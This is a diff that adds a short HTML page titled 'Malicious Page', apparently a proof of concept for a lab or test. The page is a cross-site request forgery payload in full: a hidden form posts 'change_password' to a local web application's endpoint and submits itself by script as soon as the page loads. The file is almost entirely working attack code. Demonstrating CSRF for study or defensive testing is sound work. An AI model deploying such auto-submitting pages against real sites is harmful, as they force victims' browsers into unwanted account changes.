@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Malicious Page</title>
+</head>
+<body>
+    <h1>Click the Button</h1>
+    <form id="csrfForm" action="http://localhost:5000/perform_action" method="POST">
+        <input type="hidden" name="action" value="change_password">
+    </form>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            document.getElementById("csrfForm").submit();
+        });
+    </script>
+</body>
+</html>
